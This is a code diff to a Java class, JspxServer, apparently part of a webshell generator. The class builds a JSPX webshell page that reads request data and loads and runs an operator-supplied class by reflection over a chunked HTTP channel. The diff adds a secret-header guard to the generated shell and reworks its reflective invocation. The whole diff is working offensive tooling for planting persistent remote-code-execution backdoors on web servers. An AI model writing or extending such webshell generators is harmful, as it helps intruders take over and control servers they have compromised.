@@ -1,5 +1,7 @@
 package org.leo.jmg.jsp.httpchunk;
 
+import org.leo.jmg.jsp.WebShellRequestGuard;
+
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
 import java.math.BigInteger;
@@ -7,6 +9,11 @@ import java.util.zip.GZIPOutputStream;
 
 public class JspxServer {
     public String wrap(String coreClassName,byte[] coreClass,int respCode) throws IOException {
+        return wrap(coreClassName, coreClass, respCode, null, null);
+    }
+
+    public String wrap(String coreClassName, byte[] coreClass, int respCode,
+                       String headerName, String headerValue) throws IOException {
         if (respCode < 200 || respCode == 204 || respCode == 205 || respCode == 304) {
             throw new IllegalArgumentException("httpchunk响应状态必须允许持续响应体: " + respCode);
         }
@@ -22,6 +29,7 @@ public class JspxServer {
                   "    <jsp:directive.page import=\"java.lang.reflect.Method,java.math.BigInteger,java.util.zip.GZIPInputStream\"/>\n" +
                   "    <jsp:directive.page import=\"java.io.*\"/>\n" +
                   "    <jsp:scriptlet>\n" +
+                  WebShellRequestGuard.sourceForJspx(headerName, headerValue, "        ") +
                   "        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();\n" +
                   "        byte[] buffer = new byte[1024];\n" +
                   "        int bytesRead;\n" +
@@ -65,7 +73,7 @@ public class JspxServer {
                   "                responseType=1;\n" +
                   "                ByteArrayOutputStream byteArrayOutputStream0 = new ByteArrayOutputStream();\n" +
                   "                byteArrayOutputStream0.write(data);\n" +
-                  "                Class.forName(\""+coreClassName+"\").newInstance().equals(byteArrayOutputStream0);\n" +
+                  "                ((java.lang.reflect.InvocationHandler)Class.forName(\""+coreClassName+"\").newInstance()).invoke(null, null, new Object[]{byteArrayOutputStream0});\n" +
                   "                respData = byteArrayOutputStream0.toByteArray();\n" +
                   "            }else{break;}\n" +
                   "            if(respData.length &gt; 16777216){break;}\n" +
